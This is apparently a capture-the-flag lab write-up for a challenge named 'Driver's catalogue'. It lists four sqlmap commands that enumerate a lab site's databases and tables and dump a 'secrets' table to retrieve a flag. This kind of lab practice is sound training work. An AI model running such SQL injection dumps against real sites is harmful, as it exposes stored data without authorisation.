Driver's catalogue 
1 -use SQLmap to scan for vulnerabilities 
sqlmap -u "http://web.x8wtw7l3o8o8rjzx03hk.labs.cyber-ed.space/?name=&surname=&age=&year=1900" --dbs
You can see the public database 
2 - start scanning the database 
sqlmap -u "http://web.x8wtw7l3o8o8rjzx03hk.labs.cyber-ed.space/?name=&surname=&age=&year=1900" -D public --tables --batch
You can see there are 2 tables which is secrets and users 
3 - Start scanning the tables 
sqlmap -u "http://web.x8wtw7l3o8o8rjzx03hk.labs.cyber-ed.space/?name=&surname=&age=&year=1900" -D public -T secrets --columns --batch 
and you can see the column flag 
4 - Dump the data out and you can see the flag 
sqlmap -u "http://web.x8wtw7l3o8o8rjzx03hk.labs.cyber-ed.space/?name=&surname=&age=&year=1900" -D public -T secrets --columns --batch --dump 

